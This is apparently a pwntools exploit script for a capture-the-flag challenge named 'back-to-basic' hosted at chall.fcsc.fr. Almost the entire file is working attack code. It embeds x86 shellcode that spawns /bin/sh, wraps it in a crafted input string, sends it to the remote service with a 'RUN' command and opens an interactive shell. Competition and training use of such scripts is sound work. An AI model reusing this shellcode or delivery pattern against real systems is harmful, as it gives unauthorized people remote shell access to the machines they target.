from pwn import *

PATH = "src/back-to-basic"

REMOTE = "chall.fcsc.fr"
PORT = 2108

context.binary = elf = ELF(PATH)
context.log_level = "debug"

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

exploit = b"A=(A + \"" + shellcode + b"\""

print(exploit)

# r = process(PATH)
r = remote(REMOTE, PORT)

r.sendlineafter(b"]", exploit)
r.sendlineafter(b"]", b"RUN")

r.interactive()
